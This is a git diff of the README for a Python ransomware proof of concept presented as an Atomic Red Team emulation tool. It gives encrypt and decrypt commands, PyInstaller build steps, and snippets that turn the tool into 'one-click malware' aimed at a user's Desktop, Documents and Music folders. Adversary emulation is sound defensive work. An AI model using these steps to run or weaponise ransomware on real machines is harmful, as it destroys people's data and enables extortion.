@@ -16,8 +16,7 @@ A simple python ransomware PoC that can be used for Atomic Red Team: **ATT&CK Te
 There are two versions:
 
 Version 1: main.py
-- Basic version
-- Works with Windows, Linux and macOS
+- Basic version - Terminal Only
 
 Version 2: main_v2.py
 - Advanced version
@@ -43,16 +42,10 @@ Encrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -e
 Decrypt: python3 main_v2.py -p "C:\users\jimmy\desktop\test_ransomware" -d
 ```
 
-Linux with specific path:
+Linux/macOS with specific path:
 ```
 Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
 Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
-```
-
-macOS with specific path:
-```
-Encrypt: python3 main.py -p "/home/jimmy/test_ransomware" -e
-Decrypt: python3 main.py -p "/home/jimmy/test_ransomware" -d
 ```
 
 Variables to change:
@@ -78,11 +71,11 @@ macOS:
 ```
 (python 3.7)
 python3 -m pip install pyinstaller
-pyinstaller --onefile main.py
+pyinstaller --onefile main_v2.py
 
 (python 2.7)
 pip install -I pyinstaller==3.6
-python -m PyInstaller --onefile main.py
+python -m PyInstaller --onefile main_v2.py
 ```
 
 See `/bin` folder for binaries.
@@ -101,8 +94,8 @@ Decrypt: ./main_v2 -p "/home/jimmy/test_ransomware" -d
 
 macOS with specific path:
 ```
-Encrypt: ./main_macos_py2 -p "/Users/jimmy/test_ransomware" -e
-Decrypt: ./main_macos_py2 -p "/Users/jimmy/test_ransomware" -d
+Encrypt: ./main_v2_macos_py2 -p "/Users/jimmy/test_ransomware" -e
+Decrypt: ./main_v2_macos_py2 -p "/Users/jimmy/test_ransomware" -d
 ```
 
 ## Miscellaneous 
@@ -111,7 +104,7 @@ Decrypt: ./main_macos_py2 -p "/Users/jimmy/test_ransomware" -d
 I originally added arguments to prevent accidental clicks and mess up. To simulate a one-click malware, comment and uncomment the following:
 
 Comment
-```
+```python
 if len(sys.argv) <= 1:
     print('[*] Ransomware - PoC\n')
     # banner()        
@@ -128,7 +121,7 @@ absolute_path = str(args.path)
  ```   
 
 Uncomment
-```
+```python
 absolute_path = "None"
 encrypt = True 
 decrypt = False
@@ -137,7 +130,7 @@ decrypt = False
 ### Multiple folders
 There is support for multiple paths, add them as such:
 
-```
+```python
 startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                         os.environ['USERPROFILE'] + '\\Documents',
                         os.environ['USERPROFILE'] + '\\Music',
